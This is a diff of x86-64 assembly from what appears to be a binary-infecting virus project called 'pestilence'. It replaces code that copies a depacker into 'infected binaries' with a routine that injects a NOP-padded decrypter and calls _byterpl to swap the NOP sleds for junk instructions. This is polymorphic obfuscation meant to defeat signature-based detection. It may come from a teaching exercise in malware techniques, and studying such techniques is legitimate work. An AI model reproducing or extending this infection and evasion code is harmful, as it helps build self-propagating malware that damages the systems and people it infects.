@@ -321,45 +321,29 @@ _copy_key:
 	rep movsb
 	add QWORD [rsp + 116], 256
 
-; The decrypter addr offset is different from pestilence base binary to encrypted binaries so:
-;_copy_depacker:
-;; memcpy(mmap_tmp + index, decrypt, decrypt_size)
-;	lea rax, [rel _o_entry]
-;	cmp QWORD [rax], 0
-;	je _base_binary
-
-;_infected_binary:
-; In infected binaries, the depacker is at offset _final_end + 258
-;	mov rdi, QWORD [rsp + 108]
-;	add rdi, QWORD [rsp + 116]
-;	lea rsi, [rel _decrypt]
-;	lea rcx, [rel _end_decrypt]
-;	add rcx, 2
-;	sub rcx, rsi
-;	lea rsi, [rel _final_end]
-;	add rsi, 258
-;	cld
-;	rep movsb
-;	lea rsi, [rel _decrypt]
-;	lea rcx, [rel _end_decrypt]
-;	add rcx, 2
-;	sub rcx, rsi
-;	add QWORD [rsp + 116], rcx
-;	jmp _align_to_page_size
-
-_base_binary:
-; In base pestilence binary, depacker is at offset _final_end + padding
-; so we don't need to recalculate it, and take directly _decrypt
+_inject_modified_depacker:
+; First, copy the noped depacker to destination
 	mov rdi, QWORD [rsp + 108]
 	add rdi, QWORD [rsp + 116]
-	lea rsi, [rel _decrypt]
-	lea rcx, [rel _end_decrypt]
+	lea rsi, [rel _decrypt_noped]
+	lea rcx, [rel _end_decrypt_noped]
 	add rcx, 2
 	sub rcx, rsi
 	cld
 	rep movsb
-	lea rsi, [rel _decrypt]
-	lea rcx, [rel _end_decrypt]
+
+; Then we run _byterpl(depacker start in destination, depacker size);
+; to replace nop sleds by junks instructions
+	lea rcx, [rel _decrypt_noped]
+	lea rsi, [rel _end_decrypt_noped]
+	sub rsi, rcx
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	call _byterpl
+
+; Incremente our index in our destination mmap
+	lea rsi, [rel _decrypt_noped]
+	lea rcx, [rel _end_decrypt_noped]
 	add rcx, 2
 	sub rcx, rsi
 	add QWORD [rsp + 116], rcx
